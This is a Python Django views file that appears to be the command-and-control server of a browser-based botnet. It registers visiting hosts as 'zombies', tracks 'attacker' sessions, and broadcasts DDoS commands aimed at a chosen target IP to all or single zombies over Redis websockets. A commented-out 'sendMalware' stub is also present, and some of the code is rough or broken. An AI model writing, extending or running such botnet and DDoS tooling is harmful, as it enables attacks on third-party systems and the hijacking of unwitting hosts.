from django.shortcuts import render

# Create your views here.
from ws4redis.publisher import RedisPublisher
from ws4redis.redis_store import RedisMessage
from django.views.generic.base import View,TemplateResponseMixin,ContextMixin
from rest_framework import viewsets

from rest_framework.views import APIView
from rest_framework.permissions import IsAuthenticated

from .models import Zombie,Attacker
from rest_framework.response import Response
from rest_framework.decorators import list_route
import pdb
import simplejson
from django.http import HttpResponse


Zombies = []

class ZombieConnection(View):

    global Zombies
    def get(self,request,**kwargs):


        #pdb.set_trace()
        try:
            zom = Zombie.objects.get(host=request.META['HTTP_HOST'])
        except Zombie.DoesNotExist:
            Zombie.objects.create(host=request.META['HTTP_HOST'])
        if not request.session.exists(request.session.session_key):
            request.session.create()
        zom = Zombie.objects.get(host=request.META['HTTP_HOST'])
        zom.sesskey = request.session.session_key
        zom.save()
        Zombies.append(zom)

        response=HttpResponse(simplejson.dumps("{'lol':lol'};"),'application/json')

        return response


class IndexPage(View,TemplateResponseMixin,ContextMixin):
        template_name='index.html'
        def get_context_data(self, **kwargs):
            context = super(IndexPage,self).get_context_data(**kwargs)
            context['zombies'] = Zombie.objects.all()
            return context
        def get(self,request):

            if not request.session.exists(request.session.session_key):
                    request.session.create()

            else:

                try:
                    Attacker.objects.get(sesskey=request.session.session_key)
                except Attacker.DoesNotExist:
                    Attacker.objects.create(sesskey=request.session.session_key)

            return self.render_to_response(self.get_context_data())


class ZombieControl(viewsets.ModelViewSet):

    @list_route(methods=['post'])
    def DDOS(self,request,pk=None):

        target = request.data['targetip']

        redis_publisher = RedisPublisher(facility='broadcastcontrol',broadcast=True)

        respData = {'attacktype':'ddos','attackInfo':{'targetip':target}}
        redis_publisher.publish_message(RedisMessage(simplejson.dumps(respData)))
        return Response({'ack':'ddos'})

    @list_route(methods=['post'])
    def Cancel(self,request,pk=None):

        if 'zombie'not in request.data:
            redis_publisher = RedisPublisher(facility='broadcastcontrol',broadcast=True)

            respData = {'stopattack':'true'}
            redis_publisher.publish_message(RedisMessage(simplejson.dumps(respData)))
        else:
            zom = Zombie.objects.get(host=request.data['zombie'])

            redis_publisher = RedisPublisher(facility='solo',sessions=[zom.sesskey])
                    #send to url to websocket
            redis_publisher.publish_message(RedisMessage(simplejson.dumps({'stopattack':'true'})))
        return Response({'ack':'canceled'})



class ZombieResponse(viewsets.ModelViewSet):

    def DDOSupdate(self,request,pk=None):
        pass


class ZombieCommands(viewsets.ModelViewSet):
    '''
    @list_route(methods=['post'])
    def sendMalware(self,request,pk=None):
         target = Zombies.objects.get(pk=int(request.data['target']))

         redis_publisher = RedisPublisher(facility)
    '''
